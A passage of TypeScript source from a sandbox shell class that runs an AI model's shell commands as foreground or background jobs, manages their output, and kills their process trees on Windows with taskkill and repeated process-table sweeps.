          proc.outBytes = heldOut.length;
          proc.errBytes = heldErr.length;
          settle({
            exitCode: -1,
            stdout: this.takeOutput([safeOut], proc.outTruncated, admitted.maxOutput),
            stderr: this.takeOutput([safeErr], proc.errTruncated, admitted.maxOutput),
            timedOut: true,
            durationMs: Date.now() - proc.startedAt,
            jobId: id,
            // Carried on the process, so the foreground answer, the job view and a later `shell_wait`
            // all say the same thing about whether this process was path-contained.
            ...(proc.codeExecution ? { codeExecution: proc.codeExecution } : {}),
            ...(proc.shellDialect ? { shellDialect: proc.shellDialect } : {}),
            ...(isolationInEffect(proc.isolation ?? null) ? { isolation: isolationInEffect(proc.isolation ?? null) } : {}),
          });
          return;
        }
        this.killProcess(proc, 'timeout');
        // The close handler resolves; this only guarantees an answer if the kill never lands.
        // Ref'd on purpose: an unref'd timer could be the last handle, and the awaiting caller
        // would then be left pending rather than told what happened.
        setTimeout(() => settle(this.resultOf(proc, true, admitted.maxOutput)), 2_000);      }, admitted.timeout);

      /*
       * The end of the process is handled in `spawnProc` (it is the same for a job); what belongs
       * here is only the settle. `clearTimeout` first: a command that finished inside its wait cap
       * must not be pushed into the background afterwards.
       */
      proc.onEnd = () => {
        clearTimeout(timer);
        settle(this.resultOf(proc, proc.killedBy === 'timeout', admitted.maxOutput));
      };
    });
  }

  /**
   * Start a command and return immediately with a job id.
   *
   * The policy checks are `admit()`, the same ones a foreground command passes — a background
   * command is not a lesser-checked one.
   */
  async startJob(
    command: string,
    options?: SandboxOptions,
  ): Promise<{ ok: true; job: SandboxJobView } | { ok: false; denied?: SandboxResult; reason?: string }> {
    const admitted = this.admit(command, options);
    if ('denied' in admitted) return { ok: false, denied: admitted.denied };
    this.reapJobs();
    /*
     * Refused BEFORE spawning, not after. Every job is a live process tree; discovering the limit
     * once the ninth process exists would mean either killing it (wasting the work it began) or
     * leaking it (which is what the limit exists to prevent).
     */
    if (this.liveJobCount() >= MAX_BACKGROUND_JOBS) return { ok: false, reason: capacityMessage() };
    const proc = this.spawnProc(command, admitted.cwd, admitted, options);
    const id = this.registerJob(proc);
    /*
     * A short wait before answering, so the usual first failure — a typo'd command, a missing
     * script, a refused port — is reported in the START result rather than making the model spend
     * a second call to discover that the job it just started is already dead.
     */
    await new Promise((r) => setTimeout(r, JOB_FIRST_OUTPUT_MS));
    return { ok: true, job: this.readJob(id, true)! };
  }

  /**
   * Wait for a job to end, for its output to match a pattern, or for `waitMs` to pass.
   *
   * `waitMs: 0` is a status check. The blocking form is the point of the tool: one call that
   * returns when the work is done, instead of a poll loop where every round costs a model
   * round-trip. The output returned is what was produced since the previous read, so a build that
   * prints for three minutes does not re-send its log every time.
   */
  async waitJob(
    id: string,
    opts?: { waitMs?: number; pattern?: string; onTick?: (elapsedMs: number) => void },
  ): Promise<SandboxJobView> {
    const proc = this.jobs.get(id);
    if (!proc) return notFoundJob(id);
    const waitMs = Math.max(0, Math.min(opts?.waitMs ?? 120_000, 600_000));
    const deadline = Date.now() + waitMs;
    const out: string[] = [];
    const err: string[] = [];
    let dropped = 0;
    let nextTick = Date.now() + JOB_TICK_MS;

    for (;;) {
      const read = this.readJob(id, true);
      if (!read) return notFoundJob(id);
      if (read.stdout) out.push(read.stdout);
      if (read.stderr) err.push(read.stderr);
      dropped += read.droppedBytes;

      const matched = opts?.pattern ? this.matchesTail(proc, opts.pattern) : false;
      if (read.status !== 'running' || matched || read.matched || waitMs === 0) {
        return { ...read, stdout: out.join(''), stderr: err.join(''), droppedBytes: dropped, matched };
      }
      const now = Date.now();
      if (now >= deadline) {
        return { ...read, stdout: out.join(''), stderr: err.join(''), droppedBytes: dropped };
      }
      if (opts?.onTick && now >= nextTick) {
        nextTick = now + JOB_TICK_MS;
        try {
          opts.onTick(now - proc.startedAt);
        } catch { /* a progress callback must not fail the wait */ }
      }
      await this.idle(proc, Math.min(deadline - now, 250));
    }
  }

  /**
   * Stop a job and its children.
   *
   * Waits for the process to actually die before answering, so the returned state is terminal and
   * carries the exit code. Reporting "killed" while the process is still winding down would make the
   * next read disagree with this one — and the reader has no way to tell which of the two is true.
   */
  async killJob(id: string, reason: SandboxJobKillReason = 'user'): Promise<SandboxJobView> {
    const proc = this.jobs.get(id);
    if (!proc) return notFoundJob(id);
    if (proc.status === 'running') {
      this.killProcess(proc, reason);
      await this.awaitKill(proc);
    }
    return this.readJob(id, true) ?? notFoundJob(id);
  }

  /** Resolve when the process has ended, or when `ms` passes. */
  private untilEnded(proc: Proc, ms: number): Promise<void> {
    /*
     * `exited`, not `closed`. The caller is confirming that a kill landed, and the process it killed
     * is gone at `exit`. Waiting for `close` instead also waits for the job's pipes to be released,
     * and a surviving grandchild holds them — so the wait would run its full budget on a tree whose
     * root died instantly, pushing the sweep (whose whole job is that grandchild) past everyone's
     * patience.
     */
    if (proc.closed || proc.exited) return Promise.resolve();
    return new Promise((resolve) => {
      const timer = setTimeout(() => { proc.waiters.delete(waker); resolve(); }, ms);
      const waker = () => { clearTimeout(timer); proc.waiters.delete(waker); resolve(); };
      proc.waiters.add(waker);
    });
  }

  /**
   * Every job this sandbox knows about, newest first, WITHOUT consuming output.
   *
   * Listing must not read: "what is running" and "give me the log" are different questions, and a
   * status call that quietly eats the output would make the next wait return nothing.
   */
  listJobs(): SandboxJobView[] {
    return [...this.jobs.values()].map((p) => this.viewOf(p, { consuming: false })).reverse();
  }

  runningJobs(): SandboxJobView[] {
    return this.listJobs().filter((v) => v.status === 'running');
  }

  /**
   * Stop every job. Called when the shell is discarded — the end of a session, a workspace switch,
   * process shutdown.
   *
   * A dropped reference does not stop a process. Without this, every job started by a session that
   * ended would keep running with nobody able to see or stop it, which is the orphan-process failure
   * this project has already paid for once.
   *
   * Fire-and-forget by design: killing a tree is asynchronous on Windows (`taskkill`), and this runs
   * from signal handlers and settings saves, where blocking the event loop would be worse than the
   * few milliseconds of overlap. `stopAll()` is the awaiting form, for callers that need the
   * processes to be GONE before they continue.
   */
  dispose(): void {
    /*
     * Delegates to `stopAll` and ignores the promise, rather than being its own shorter version.
     *
     * A second implementation is how the two drift: the kill would land, the verification would be
     * skipped, and `dispose()` would quietly be the path that leaks a grandchild — which is the path
     * taken at shutdown, when nothing is left to notice. The entries stay in the table until the
     * teardown has finished, so a `stopAll()` arriving right after still sees them.
     */
    void this.stopAll();
  }

  /**
   * Stop every job and wait for the processes to actually end.
   *
   * Exists because "killed" is reported the moment the signal is sent, while the process may need
   * another moment to die — and on Windows whatever holds a directory handle keeps it locked until
   * then. A caller that is about to remove a workspace, or a test that is about to delete its temp
   * directory, needs the second fact rather than the first.
   */
  async stopAll(): Promise<void> {
    const pops = [...this.jobs.values()].filter((p) => p.status === 'running');
    for (const proc of pops) this.killProcess(proc, 'shutdown');
    await Promise.all(pops.map((p) => this.awaitKill(p)));
    this.jobs.clear();
  }

  /** Wait for a kill that `killProcess` already started. Never rejects; every failure here is best-effort. */
  private async awaitKill(proc: Proc): Promise<void> {
    if (proc.killDone) await proc.killDone;
  }

  // ── process plumbing ──────────────────────────────────────────────────────

  /** Spawn one command and wire its output into a `Proc`. Shared by `exec` and `startJob`. */
  private spawnProc(
    command: string,
    cwd: string,
    admitted: {
      maxOutput: number;
      codeExecution?: CodeExecutionOnCommandLine;
      isolation?: { plan: IsolationPlan; cwdRel: string };
      shellDialect?: ShellDialectReport;
    },
    options?: SandboxOptions,
  ): Proc {
    /*
     * How the command reaches the shell.
     *
     * ─────────────────────────────────────────────────────────────────────────────
     * `spawn('cmd.exe', ['/c', command])` CORRUPTS QUOTED ARGUMENTS ON WINDOWS.
     *
     * Node escapes an argument containing spaces or quotes when building the Windows
     * command line, and cmd.exe then re-parses it — so the quotes do not survive.
     * Measured:
     *
     *   node -e "console.log(1)"              → (no output)   should be 1
     *   node -p "1+1"                         → 1+1           should be 2
     *   node -e "console.log('a b')"          → SyntaxError
     *
     * Exit code 0 in the first case, which is the dangerous part: every command with a
     * quoted argument — `git commit -m "..."`, `grep "pattern" file`, most one-liners —
     * silently did something other than what was asked, and reported success.
     *
     * `shell: true` makes Node emit `cmd.exe /d /s /c "<command>"` itself, which is the
     * form that works. Verified against all of the cases above (scripts/
     * quote-check.mjs keeps them as a regression test).
     *
     * The explicit powershell preference is kept, but its arguments are passed the way
     * PowerShell expects rather than as `/c`.
     * ─────────────────────────────────────────────────────────────────────────────
     */
    /*
     * Only an explicit `powershell` preference needs the special form; everything else
     * goes through `shell: true`, which handles cmd.exe, /bin/sh and bash correctly.
     *
     * The binary name differs by platform: `pwsh` on macOS/Linux (PowerShell 7+),
     * `powershell.exe` on Windows. Using the Windows name elsewhere meant the spawn
     * failed with an unhelpful "not found" instead of running the shell the user asked
     * for — or saying it is not installed.
     */
    const powershellBin = IS_WINDOWS ? 'powershell.exe' : 'pwsh';
    const childEnv = {
      ...process.env,
      ...options?.env,
      // Python otherwise inherits the GBK console and throws UnicodeEncodeError
      // on the first non-ASCII print (¥, 中文).
      PYTHONIOENCODING: process.env.PYTHONIOENCODING || 'utf-8',
      PYTHONUTF8: process.env.PYTHONUTF8 || '1',
    };
    const child = this.config.shell === 'powershell' && !admitted.isolation
      ? spawn(powershellBin, ['-NoProfile', '-NonInteractive', '-Command', command], {
          cwd,
          env: childEnv,
          stdio: ['ignore', 'pipe', 'pipe'],
          windowsHide: true,
        })
      : spawnCommand(command, cwd, childEnv, this.workspaceRoot, admitted.isolation);

    const proc: Proc = {
      id: '',
      command,
      child,
      startedAt: Date.now(),
      endedAt: null,
      exitCode: null,
      status: 'running',
      out: [],
      err: [],
      outBytes: 0,
      errBytes: 0,
      outTruncated: false,
      errTruncated: false,
      droppedBytes: 0,
      tail: [],
      tailBytes: 0,
      waiters: new Set(),
      lifeTimer: null,
      closed: false,
      ...(admitted.codeExecution ? { codeExecution: admitted.codeExecution } : {}),
      ...(admitted.isolation ? { isolation: admitted.isolation.plan } : {}),
      ...(admitted.shellDialect ? { shellDialect: admitted.shellDialect } : {}),
    };

    const capOutput = admitted.maxOutput > 0;
    child.stdout!.on('data', (chunk: Buffer) => {
      if (proc.outTruncated) return;
      proc.out.push(chunk);
      proc.outBytes += chunk.length;
      if (capOutput && proc.outBytes > admitted.maxOutput) proc.outTruncated = true;
      this.pushTail(proc, chunk);
      this.trimUnread(proc);
      this.wake(proc);
    });

    child.stderr!.on('data', (chunk: Buffer) => {
      if (proc.errTruncated) return;
      proc.err.push(chunk);
      proc.errBytes += chunk.length;
      if (capOutput && proc.errBytes > admitted.maxOutput) proc.errTruncated = true;
      this.pushTail(proc, chunk);
      this.wake(proc);
    });

    /*
     * End-of-process handling lives HERE, not in `exec`.
     *
     * It used to be two closures inside `exec`, which meant a job started with `background: true` —
     * a path that never goes through `exec` — had no `close` handler at all: the process ended, and
     * the job stayed "running" until its lifetime cap. Found by the smoke run: a two-second command
     * answered "still running (5.9s)" and its output never carried an exit code.
     */
    child.on('close', (code) => this.finishProc(proc, { code }));
    child.on('error', (err) => this.finishProc(proc, { code: null, error: err }));
    // The process is gone, whatever its pipes are still doing. See `Proc.exited`.
    child.on('exit', () => { proc.exited = true; this.wake(proc); });

    return proc;
  }

  /** Record that a process ended, wake anyone waiting, and let the caller finish up. */
  private finishProc(proc: Proc, ev: { code: number | null; error?: Error }): void {
    if (proc.closed) return;
    if (ev.error) {
      proc.err.push(Buffer.from(ev.error.message));
      proc.errBytes += ev.error.message.length;
    }
    proc.endedAt = Date.now();
    proc.exitCode = ev.error ? 1 : (ev.code ?? 1);
    proc.status = proc.killedBy ? 'killed' : 'done';
    proc.closed = true;
    this.wake(proc);
    proc.onEnd?.(ev);
  }

  /** Render a finished (or not yet finished) process the way `exec` has always rendered it. */
  private resultOf(proc: Proc, timedOut: boolean, maxOutput: number): SandboxResult {
    return {
      exitCode: timedOut ? 124 : (proc.exitCode ?? 1),
      stdout: this.takeOutput(proc.out, proc.outTruncated, maxOutput),
      stderr: this.takeOutput(proc.err, proc.errTruncated, maxOutput),
      timedOut,
      durationMs: Date.now() - proc.startedAt,
      ...(proc.codeExecution ? { codeExecution: proc.codeExecution } : {}),
      ...(proc.shellDialect ? { shellDialect: proc.shellDialect } : {}),
      ...(isolationInEffect(proc.isolation ?? null) ? { isolation: isolationInEffect(proc.isolation ?? null) } : {}),
    };
  }

  private takeOutput(chunks: Buffer[], truncated: boolean, maxOutput: number): string {
    let text = decodeConsoleOutput(Buffer.concat(chunks));
    if (truncated) text = text.slice(0, maxOutput) + '\n[output truncated]';
    return text;
  }

  /**
   * Name a process and make it addressable.
   *
   * Returns the id. The lifetime cap starts here rather than at spawn: a command that finishes
   * inside its wait cap was never a job, and a timer that outlives the command would keep the
   * event loop and an entry alive for nothing.
   */
  private registerJob(proc: Proc): string {
    this.jobSeq += 1;
    proc.id = `job_${this.jobSeq}`;
    proc.lifeTimer = setTimeout(() => {
      if (proc.status === 'running') this.killProcess(proc, 'lifetime');
    }, JOB_MAX_LIFETIME_MS);
    proc.lifeTimer.unref?.();
    this.jobs.set(proc.id, proc);
    return proc.id;
  }

  /**
   * Forget the oldest finished jobs so their output does not pin memory for the process lifetime.
   *
   * The `keep` window is what makes `shell_jobs` useful after the fact — "the build I started is
   * gone, what did it say?" — and it is deliberately not the capacity limit below: a finished job
   * holds no process, so it must not count against how many the session may RUN.
   */
  private reapJobs(): void {
    const finished = [...this.jobs.values()].filter((p) => p.status !== 'running');
    const keep = 20;
    for (const proc of finished.slice(0, Math.max(0, finished.length - keep))) {
      if (proc.lifeTimer) clearTimeout(proc.lifeTimer);
      this.jobs.delete(proc.id);
    }
  }

  /**
   * How many jobs are actually running.
   *
   * Only live processes count against `MAX_BACKGROUND_JOBS`. Counting finished ones looked
   * equivalent and was not: after eight commands had finished, every later command was refused for
   * capacity, and the message told the reader to free a slot that was already free. Found by the
   * unit tests, where a handful of short jobs was enough to wedge the whole session.
   */
  private liveJobCount(): number {
    let n = 0;
    for (const proc of this.jobs.values()) if (proc.status === 'running') n++;
    return n;
  }

  /**
   * Stop one job's process tree.
   *
   * ─────────────────────────────────────────────────────────────────────────────
   * ON WINDOWS THE TREE MUST BE KILLED FROM THE TOP, IN ONE ACTION.
   *
   * The process the sandbox holds is `powershell.exe`, which is the parent of a
   * `cmd.exe`, which is the parent of whatever the command actually started:
   *
   *     sandbox ── powershell.exe ── cmd.exe ── node / python / …
   *
   * `taskkill /T /F` walks that tree downward from a pid. Killing the held
   * process FIRST and then running `taskkill /T` walks a tree whose root no
   * longer exists, so it matches nothing and the children are left running with
   * no parent, no owner and no way to reach them by name — measured: a suite of
   * twelve killed jobs left twelve live process pairs behind, and every one of
   * them held both its output pipes and the working directory open.
   *
   * So the order is: `taskkill /T /F` while the tree is still rooted, and the
   * direct `kill()` only as the fallback for when `taskkill` itself fails.
   * ─────────────────────────────────────────────────────────────────────────────
   */
  private killProcess(proc: Proc, reason: SandboxJobKillReason): void {
    if (proc.killedBy) return;
    proc.killedBy = reason;
    proc.status = 'killed';
    const pid = proc.child.pid;
    if (!pid) {
      try { proc.child.kill('SIGKILL'); } catch { /* already gone */ }
      return;
    }
    if (!IS_WINDOWS) {
      try {
        // The child is spawned detached, so it leads its own process group: killing the group
        // takes the grandchildren with it, which killing the pid alone does not.
        process.kill(-pid, 'SIGKILL');
      } catch {
        try { proc.child.kill('SIGKILL'); } catch { /* already gone */ }
      }
      return;
    }
    /*
     * The kill is asynchronous on Windows, and it has to start with a read of the process table.
     *
     * The tree is captured BEFORE `taskkill` runs, while every link in it is still alive and
     * therefore still walkable. Afterwards the chain is no longer readable: `taskkill /T` reaps the
     * intermediates, and a surviving grandchild then points at a parent id that no longer resolves.
     * That pre-kill read is the only complete description of the tree that will ever exist, so it is
     * what the post-kill sweeps are checked against. Measured: without it, eight jobs stopped at once
     * left a `node -e "setInterval(...)"` that no later pass could attribute to its job.
     *
     * `killedBy`/`status` are already set above, so the job reads as killed immediately even though
     * the signal lands a table-read later; `killDone` is what callers await for the real end.
     */
    proc.killDone = (async () => {
      const trace = (m: string) => { if (process.env.SHE_TRACE_KILL) console.error(`[kill ${pid}] ${m}`); };
      trace('chain start');
      const known = new Set<number>([pid]);
      await SandboxShell.descendantsOf(pid, known);
      trace(`pre-snapshot known=${[...known].join(',')}`);
      try {
        /*
         * Kept, not unref'd, and kept on the record: `stopAll` waits for this helper, and the handle
         * must not let the process exit before the kill has landed. It lives for tens of milliseconds.
         */
        proc.killHelper = spawn('taskkill', ['/pid', String(pid), '/T', '/F'], { stdio: 'ignore', windowsHide: true });
      } catch {
        proc.killHelper = null;
      }
      if (!proc.killHelper) {
        // `taskkill` did not even start — the direct kill is then the best available.
        try { proc.child.kill(); } catch { /* already gone */ }
      }
      await this.completeKill(proc, known);
    })().catch(() => { /* nothing left to try */ });
  }

  /**
   * Wait until a job's process tree is really gone, not merely told to go.
   *
   * ─────────────────────────────────────────────────────────────────────────────
   * `taskkill /T` TAKES A SNAPSHOT, AND A SNAPSHOT CAN MISS A PROCESS.
   *
   * The tree is three deep and the interesting process is the last one:
   *
   *     sandbox ── powershell.exe ── cmd.exe ── node / python / …
   *
   * `taskkill /T` walks the descendant list once, then kills what it listed. A
   * grandchild created while that list is being built — which is exactly what
   * happens when the kill lands while `cmd.exe` is still starting the real
   * command — is not in it and is never killed. Measured: a file whose every
   * test passed left two live `cmd.exe`+`node` pairs behind, each holding its
   * own output pipes open (so the parent could not exit) and the temp directory
   * locked (so removing it failed with EBUSY).
   *
   * So after the batch kill, the descendants are re-read and anything still
   * alive is killed by pid. This works even though the root is already dead,
   * because Windows records the parent id a process was CREATED with and does
   * not rewrite it when the parent dies — the chain back to our root is still
   * walkable, which is precisely why the sweep can find what `/T` missed.
   * ─────────────────────────────────────────────────────────────────────────────
   */
  private async completeKill(proc: Proc, known: Set<number>): Promise<void> {
    const trace = (m: string) => { if (process.env.SHE_TRACE_KILL) console.error(`[completeKill ${proc.child.pid}] ${m}`); };
    trace(`start helper=${proc.killHelper ? 'yes' : 'no'} closed=${proc.closed} exited=${proc.exited}`);
    const helper = proc.killHelper;
    if (helper) {
      await Promise.race([
        new Promise<void>((resolve) => {
          helper.once('close', () => resolve());
          helper.once('error', () => resolve());
        }),
        new Promise<void>((resolve) => { setTimeout(resolve, 5_000).unref(); }),
      ]);
    }
    await this.untilEnded(proc, 5_000);

    /*
     * Converge rather than sweep once.
     *
     * A single sweep closes the window but does not close it completely: a grandchild created while
     * the SWEEP's own snapshot is being taken is missed for exactly the same reason it was missed by
     * `/T`. Measured — stopping eight jobs at once left one `node.exe` alive out of sixteen
     * processes, which is the load-dependent tail of the same race.
     *
     * So the sweep repeats until the descendant set is empty. It converges in practice because a
     * process tree only grows while the command is starting up; by the second pass the tree is
     * either gone or was never going to end on its own. The bound exists because a command that
     * spawns forever must not turn teardown into an infinite loop — at that point one pass per
     * attempt has been made and the remaining processes are the user's own to deal with.
     */
    if (!IS_WINDOWS) return;
    const root = proc.child.pid;
    if (!root) return;
    known.add(root);
    /*
     * Sweep until the tree is quiet twice in a row.
     *
     * One empty pass is not proof of an empty tree: a process created just after the table was read
     * is invisible to that read, so the run that found nothing is exactly the run that would have
     * missed the newcomer. Requiring a second quiet pass after a short pause is what makes "nothing
     * left" mean "nothing left that appeared while we were looking".
     *
     * The bound exists because a command that spawns forever must not turn teardown into an infinite
     * loop — by then the user's own process is the thing to deal with, not this function's.
     */
    let quiet = 0;
    let unreadable = 0;
    for (let attempt = 0; attempt < 6; attempt++) {
      const survivors = await SandboxShell.descendantsOf(root, known);
      trace(`pass ${attempt} survivors=${survivors === null ? 'UNREADABLE' : survivors.join(',')}`);
      /*
       * An unreadable table is NOT an empty tree. Counting it as quiet is how the sweep reported
       * success on a tree it had never seen; retrying is the only honest response, and the pass is
       * not counted as quiet either way.
       */
      if (survivors === null) {
        unreadable++;
        await new Promise<void>((resolve) => { setTimeout(resolve, 150); });
        continue;
      }
      if (survivors.length === 0) {
        quiet++;
        if (quiet >= 2) return;
        /*
         * Deliberately NOT unref'd, for the reason `idle` documents: on the confirmation pass the
         * tree is already gone, so this timer is the ONLY handle left. Unref'd, Node sees an empty
         * event loop and exits with `killDone` still pending — every test in the file then fails as
         * `cancelledByParent` ("Promise resolution is still pending but the event loop has already
         * resolved"), which says nothing about what actually went wrong.
         */
        await new Promise<void>((resolve) => { setTimeout(resolve, 80); });
        continue;
      }
      quiet = 0;
      await new Promise<void>((resolve) => {
        const swept = spawn(
          'taskkill',
          [...survivors.flatMap((p) => ['/pid', String(p)]), '/T', '/F'],
          { stdio: 'ignore', windowsHide: true },
        );
        swept.once('close', () => resolve());
        swept.once('error', () => resolve());
      });
    }
    /*
     * Out of attempts. Say so rather than returning quietly: the caller reports "killed" as a fact, so
     * a teardown that could not be confirmed has to leave a trace somewhere, and the log is the only
     * place a background cleanup can leave one.
     */
    console.warn(`[sandbox] 作业 ${proc.id} 的进程树${unreadable > 0 ? '在进程表读不到的情况下' : ''}未能确认清空，已放弃继续清理（root=${root}）。`);
  }

  /**
   * Every live process whose ancestry reaches `root`, or `null` when the process table could not be
   * read at all.
   *
   * That distinction is the whole point of the return type. An empty array means "the tree is gone"
   * and every caller acts on it by stopping; a table read that failed also produces zero rows, so
   * returning `[]` for both made an unreadable table indistinguishable from a clean one, and the
   * sweep would declare success on a tree it never looked at. Measured: the sweep reported nothing
   * left and stopped, twice in a row, while the orphan it was hunting was still running.
   *
   * Walks UP from each process rather than down from `root`, which is what makes the sweep work after
   * `taskkill /T` has already killed the intermediate processes: Windows records the parent id a
   * process was CREATED with and does not rewrite it when the parent dies, so a surviving grandchild
   * still points at its dead parent.
   *
   * `known` carries the rest of the answer. Walking up needs a live table entry for EVERY step, so a
   * chain is unreadable past the first ancestor that has already been REAPED — the link is gone and
   * no amount of retrying brings it back. So the caller keeps the set of pids it has already
   * established as descendants of this root, and a process whose chain breaks on one of those is ours
   * too. The set only grows, which is what makes the sweep converge.
   *
   * Known limit: a process whose entire ancestry was reaped before the FIRST pass was never observed
   * and so cannot be claimed. Nothing can recover that from the process table.
   */
  private static async descendantsOf(root: number, known: Set<number>): Promise<number[] | null> {
    /*
     * Windows-only by contract, stated in code rather than in prose.
     *
     * There is no process-table walk here for POSIX and there does not need to be: the child is
     * spawned detached, so `process.kill(-pid)` reaches the whole group and there is no window for a
     * missed descendant to survive in. Returning `null` — the "could not verify" answer, never read as
     * "clean" — keeps that honest if this is ever reached off Windows.
     */
    if (!IS_WINDOWS) return null;
    /*
     * `wmic` is the fast one and is present on every Windows this sandbox supports today, but it is
     * deprecated and absent on newer builds; the PowerShell query is the fallback so that verification
     * does not silently become "none" on a machine where it is missing.
     */
    let table = await SandboxShell.readProcessTable(
      'wmic',
      ['process', 'get', 'ProcessId,ParentProcessId', '/format:csv'],
    );
    if (!table) {
      table = await SandboxShell.readProcessTable('powershell.exe', [
        '-NoProfile',
        '-NonInteractive',
        '-Command',
        'Get-CimInstance Win32_Process | ForEach-Object { "$($_.ProcessId),$($_.ParentProcessId)" }',
      ]);
    }
    // Both methods down: unknown, and the caller must not read that as "clean".
    if (!table) return null;
    const parentOf = new Map<number, number>();
    for (const line of table.split('\n')) {
      const cells = line.trim().split(',');
      const ppid = Number(cells[cells.length - 2]);
      const pid = Number(cells[cells.length - 1]);
      if (Number.isInteger(ppid) && Number.isInteger(pid) && pid > 0) parentOf.set(pid, ppid);
    }
    /*
     * A parse that produced almost nothing is a broken read, not a quiet machine: a running Windows
     * always has dozens of processes, and every one of them is between us and the root. Treating a
     * truncated read as an empty table is the same failure as returning `[]` above, one level deeper.
     */
    if (parentOf.size < 8) return null;
    const out: number[] = [];
    for (const pid of parentOf.keys()) {
      /*
       * NOT skipped when `pid` is already in `known`. The set records what has been established as
       * ours, and a pid that is ours but still alive is exactly what this function exists to report —
       * skipping it is how the sweep came to announce an empty tree while the process it had just
       * identified was still running. Killing is idempotent, so re-reporting is harmless; the pass
       * after a successful kill simply does not see the pid any more.
       */
      if (pid === root || known.has(pid)) {
        // Still ours, and still alive if it is in the table at all: report it.
        if (pid !== root) out.push(pid);
        continue;
      }
      const seen = new Set<number>([pid]);
      let cur = pid;
      for (;;) {
        const up = parentOf.get(cur);
        /*
         * The chain ran out. Either it never reached us, or the step that would have proved it is a
         * pid that has already been reaped — `known` is the only thing that can still answer that.
         *
         * The residual risk is pid reuse inside the teardown window: if a pid in `known` has been
         * recycled by an unrelated process, that process's children are claimed here. The window is
         * about a second and Windows reuses a pid only after the counter wraps, so this is accepted
         * rather than solved — the alternative is leaking the process the sweep exists to catch.
         */
        if (up === undefined) {
          if (known.has(cur)) out.push(pid);
          break;
        }
        if (up === root || known.has(up)) { out.push(pid); break; }
        // `up === cur` and a cycle both mean the chain ended without reaching us.
        if (up === cur || seen.has(up)) break;
        seen.add(up);
        cur = up;
      }
    }
    // Widen the closure so the next pass can see through this one.
    for (const pid of out) known.add(pid);
    return out;
  }

  /** Run a process-table query. `null` on any failure, which callers read as "unknown", not "empty". */
  private static readProcessTable(bin: string, args: string[]): Promise<string | null> {
    return new Promise((resolve) => {
      execFile(bin, args, { windowsHide: true, timeout: 5_000, maxBuffer: 8 * 1024 * 1024 }, (err, stdout) =>
        resolve(err ? null : stdout));
    });
  }

  /**
   * Read a job's unread output, consuming it.
   *
   * `consuming: false` is the status-only view (`listJobs`), which must not eat the log.
   */
  private readJob(id: string, consuming: boolean): SandboxJobView | null {
    const proc = this.jobs.get(id);
    if (!proc) return null;
    return this.viewOf(proc, { consuming });
  }

  private viewOf(proc: Proc, opts: { consuming: boolean }): SandboxJobView {
    const view: SandboxJobView = {
      found: true,
      id: proc.id,
      command: proc.command,
      status: proc.status,
      exitCode: proc.status === 'running' ? null : proc.exitCode,
      elapsedMs: (proc.endedAt ?? Date.now()) - proc.startedAt,
      stdout: '',
      stderr: '',
      droppedBytes: 0,
      pendingBytes: proc.outBytes + proc.errBytes,
    };
    if (proc.killedBy) view.killedBy = proc.killedBy;
    if (proc.codeExecution) view.codeExecution = proc.codeExecution;
    /*
     * The dialect note is on every view too, and for the same reason as the boundary note below:
     * a `shell_wait` three calls later is read as a fresh result, and "the command running here is
     * not the command you wrote" is not something a later reader can re-derive.
     */
    if (proc.shellDialect) view.shellDialect = proc.shellDialect;
    /*
     * The boundary is reported on every view, including the status-only one: a `shell_jobs` listing
     * that omitted it would let a reader assume the wrong thing about a running job, and the note
     * costs one line.
     */
    const iso = isolationInEffect(proc.isolation ?? null);
    if (iso) view.isolation = iso;
    if (!opts.consuming) return view;

    /*
     * Hold back a trailing incomplete UTF-8 sequence. Without this a chunk boundary inside a
     * Chinese character turns it into U+FFFD in the model's context — a character the program
     * never printed, presented as its output.
     */
    if (proc.status === 'running') {
      const [safeOut, heldOut] = splitCompleteUtf8(Buffer.concat(proc.out));
      const [safeErr, heldErr] = splitCompleteUtf8(Buffer.concat(proc.err));
      view.stdout = decodeConsoleOutput(safeOut);
      view.stderr = decodeConsoleOutput(safeErr);
      proc.out = heldOut.length ? [heldOut] : [];
      proc.err = heldErr.length ? [heldErr] : [];
      proc.outBytes = heldOut.length;
      proc.errBytes = heldErr.length;
    } else {
      view.stdout = decodeConsoleOutput(Buffer.concat(proc.out));
      view.stderr = decodeConsoleOutput(Buffer.concat(proc.err));
      proc.out = [];
      proc.err = [];
      proc.outBytes = 0;
      proc.errBytes = 0;
    }
    view.droppedBytes = proc.droppedBytes;
    proc.droppedBytes = 0;
    view.pendingBytes = proc.outBytes + proc.errBytes;
    return view;
  }

  /** Bound one job's unread output by dropping the oldest bytes. */
  private trimUnread(proc: Proc): void {
    let over = proc.outBytes + proc.errBytes - JOB_OUTPUT_CAP_BYTES;
    if (over <= 0) return;
    const droppedOut = this.dropFront(proc.out, over);
    proc.out = droppedOut.chunks;
    proc.outBytes = Math.max(0, proc.outBytes - droppedOut.dropped);
    over -= droppedOut.dropped;
    const droppedErr = this.dropFront(proc.err, over);
    proc.err = droppedErr.chunks;
    proc.errBytes = Math.max(0, proc.errBytes - droppedErr.dropped);
    const dropped = droppedOut.dropped + droppedErr.dropped;
    if (dropped <= 0) return;
    proc.droppedBytes += dropped;
    /*
     * The marker goes at the FRONT of what is left, where the missing bytes were. Appending it
     * would read as "this happened after the output below", which is the opposite of true.
     */
    const marker = Buffer.from(`\n[... 已丢弃 ${dropped} 字节较早的输出 ...]\n`);
    proc.out.unshift(marker);
    proc.outBytes += marker.length;
  }

  /** Drop up to `bytes` from the front of a chunk list, reporting how many went. */
  private dropFront(chunks: Buffer[], bytes: number): { chunks: Buffer[]; dropped: number } {
    let remaining = bytes;
    let dropped = 0;
    while (remaining > 0 && chunks.length > 0) {
      const head = chunks[0];
      if (head.length <= remaining) {
        chunks.shift();
        dropped += head.length;
        remaining -= head.length;
      } else {
        chunks[0] = head.subarray(remaining);
        dropped += remaining;
        remaining = 0;
      }
    }
    return { chunks, dropped };
  }

  /** Keep the last `JOB_TAIL_BYTES` of output for `pattern` matching. */
  private pushTail(proc: Proc, chunk: Buffer): void {
    proc.tail.push(chunk);
    proc.tailBytes += chunk.length;
    while (proc.tailBytes > JOB_TAIL_BYTES && proc.tail.length > 1) {
      proc.tailBytes -= proc.tail.shift()!.length;
    }
  }

  /**
   * Whether the recent output matches `pattern`.
   *
   * Matched against a rolling tail rather than only the unread bytes, so waiting for a line that
   * already scrolled past (a server's "listening on…") answers immediately instead of blocking
   * until the wait cap. The pattern is the caller's, and an invalid one is refused before this.
   */
  private matchesTail(proc: Proc, pattern: string): boolean {
    try {
      return new RegExp(pattern, 'm').test(decodeConsoleOutput(Buffer.concat(proc.tail)));
    } catch {
      return false;
    }
  }

  private wake(proc: Proc): void {
    for (const fn of [...proc.waiters]) fn();
    proc.waiters.clear();
  }

